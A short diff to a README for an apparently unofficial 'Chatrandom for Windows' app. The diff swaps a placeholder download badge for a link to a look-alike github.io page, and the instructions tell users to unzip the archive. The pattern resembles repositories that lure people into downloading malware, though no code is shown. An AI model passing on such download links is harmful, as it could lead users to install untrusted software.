@@ -6,7 +6,7 @@ Chatrandom for Windows makes online social discovery effortless by connecting yo
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://chatrandom-for-pc-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
